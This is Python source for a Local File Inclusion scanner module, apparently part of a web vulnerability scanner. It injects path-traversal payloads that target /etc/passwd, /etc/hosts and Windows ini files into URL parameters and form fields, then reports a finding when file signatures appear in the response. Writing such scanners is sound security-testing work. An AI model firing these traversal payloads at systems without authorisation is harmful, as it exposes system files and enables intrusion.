from colorama import Fore, Style
from modules.base import BaseScanner
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode

class LFIScanner(BaseScanner):
    """
    Scanner to detect Local File Inclusion (LFI) vulnerabilities.
    Focuses scanning efforts based on target OS (Linux/Windows) and tests
    only existing parameters plus 4 common parameter names.
    """
    
    # Reduced list of common parameters (4 parameters)
    COMMON_LFI_PARAMS = ["file", "page", "id", "path"]
    
    # Payloads structured by target OS: 
    # (Description, Expected_Signature, Payload_String)
    LFI_PAYLOADS = {
        "LINUX": [
            ("Linux /etc/passwd", "root:", "../../../../../etc/passwd"),
            ("Linux /etc/hosts", "localhost", "../../../../../etc/hosts"),
        ],
        "WINDOWS": [
            ("Windows win.ini", "[fonts]", "../../../../../windows/win.ini"),
            ("Windows boot.ini", "[boot loader]", "../../../../../boot.ini"),
            ("Windows system.ini", "[386Enh]", "../../../../../windows/system.ini"),
        ],
        "GENERIC": [
            ("Local Index File", "<html>", "index.php"),
        ]
    }
    
    VULN_TYPE = "Local File Inclusion (LFI)"
    VULN_SEVERITY = "High"
    
    def __init__(self, target_url, session, config):
        super().__init__(target_url, session, config)
        self.target_os = "UNKNOWN"

    def _determine_target_os(self):
        """Attempts to detect the target OS by testing the base URL with common LFI payloads."""
        
        # Prepare a base URL for the test query, using 'file' as a placeholder parameter
        test_url_base = self.target_url + ('?' if '?' not in self.target_url else '&') + "file="
        
        # 1. Test Linux Payload (/etc/passwd)
        linux_payload = self.LFI_PAYLOADS["LINUX"][0] 
        response_linux = self.session.get(test_url_base + linux_payload[2])
        if response_linux and linux_payload[1] in response_linux.text:
            return "LINUX"

        # 2. Test Windows Payload (win.ini)
        windows_payload = self.LFI_PAYLOADS["WINDOWS"][0] 
        response_windows = self.session.get(test_url_base + windows_payload[2])
        if response_windows and windows_payload[1] in response_windows.text:
            return "WINDOWS"

        return "UNKNOWN"

    def _get_payloads_to_test(self):
        """Returns the list of LFI payloads filtered by the detected OS."""
        payloads = self.LFI_PAYLOADS.get("GENERIC", []).copy()
        
        if self.target_os == "LINUX":
            payloads.extend(self.LFI_PAYLOADS.get("LINUX", []))
        elif self.target_os == "WINDOWS":
            payloads.extend(self.LFI_PAYLOADS.get("WINDOWS", []))
        else:
            # Test both if OS is unknown
            payloads.extend(self.LFI_PAYLOADS.get("LINUX", []))
            payloads.extend(self.LFI_PAYLOADS.get("WINDOWS", []))
            
        return payloads

    def scan(self, forms=None, urls=None):
        # 1. Run OS detection 
        self.target_os = self._determine_target_os()
        
        print(f"{Fore.YELLOW}[*] Starting Local File Inclusion (LFI) Scan. Targeting {self.target_os} payloads.{Style.RESET_ALL}")
        
        # 2. Test GET parameters on found URLs
        if urls:
            for url in urls:
                self._test_url_parameters(url)

        # 3. Test input fields on found forms
        if forms:
            for form in forms:
                self._test_form_inputs(form)

    def _test_url_parameters(self, url):
        """Tests each existing and the limited set of common GET parameters for LFI."""
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Combine existing parameters with the REDUCED list of common LFI parameter names
        params_to_test = set(query_params.keys()).union(self.COMMON_LFI_PARAMS)
        
        payloads_to_test = self._get_payloads_to_test()
        
        for key in params_to_test:
            for name, expected_sig, payload in payloads_to_test:
                
                # Build a new query with the LFI payload injected into the target key
                test_params = query_params.copy()
                test_params[key] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed_url._replace(query=new_query))
                
                response = self.session.get(test_url)
                self._check_response(response, name, expected_sig, f"GET parameter '{key}' at {test_url}")
                
    def _test_form_inputs(self, form):
        """Tests each form input field for LFI."""
        url = form['action']
        method = form['method']
        
        payloads_to_test = self._get_payloads_to_test()

        for input_field in form.get('inputs', []):
            input_name = input_field.get('name')
            if not input_name:
                continue

            for name, expected_sig, payload in payloads_to_test:
                # Prepare data with all inputs, setting default values
                data = {i.get('name'): i.get('name') for i in form.get('inputs', []) if i.get('name')}
                
                # Inject the LFI payload into the target field
                data[input_name] = payload
                
                response = None
                if method == 'POST':
                    response = self.session.post(url, data=data)
                elif method == 'GET':
                    # For GET forms, use 'params' for the URL query string
                    response = self.session.get(url, params=data)
                
                if response:
                    self._check_response(response, name, expected_sig, f"{method} form field '{input_name}' at {url}")

    def _check_response(self, response, payload_name, expected_signature, location_detail):
        """Checks if the response contains the signature of the successfully included file."""
        if response and expected_signature in response.text:
            
            # Combine details and location_detail to fix the 'too many arguments' error
            details = (
                f"LFI detected! Included file '{payload_name}' signature ('{expected_signature}') found in response. "
                f"Location: {location_detail}"
            )

            self.add_vulnerability(
                self.VULN_TYPE,
                details,
                self.VULN_SEVERITY
            )
            print(f"{Fore.RED}[!] LFI VULNERABILITY FOUND: {payload_name} - {location_detail}{Style.RESET_ALL}")